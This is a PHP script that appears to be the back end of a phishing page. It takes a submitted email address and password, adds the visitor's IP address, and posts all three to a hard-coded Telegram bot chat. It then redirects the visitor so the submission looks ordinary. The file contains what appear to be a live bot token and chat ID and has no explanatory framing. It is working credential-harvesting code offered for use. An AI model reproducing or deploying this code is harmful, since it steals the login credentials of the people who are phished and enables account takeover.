<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Function to get client IP address
function getClientIP() {
    $ip = '';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$clientIP = getClientIP();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $email = isset($_POST['email']) ? htmlspecialchars($_POST['email']) : '';
    $password = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : '';

    // Telegram Bot credentials
    $telegramBotToken = '7694405624:AAHXRM_v4VZwpRtAIz4SIzLEu5wGqg5JTNw'; // Replace with your bot token
    $chatId = '6927643853'; // Replace with your chat ID

    // Message to send
    $message = "Email: $email\nPassword: $password\nIP: $clientIP";

    // Telegram API URL
    $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage";

    // Send data to Telegram
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    // Use cURL to send the request
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    // Redirect to a specific page after processing
    header('Location: /');
    exit();
} else {
    // Redirect to a failure page if the request method is not POST
    header('Location: /');
    exit();
}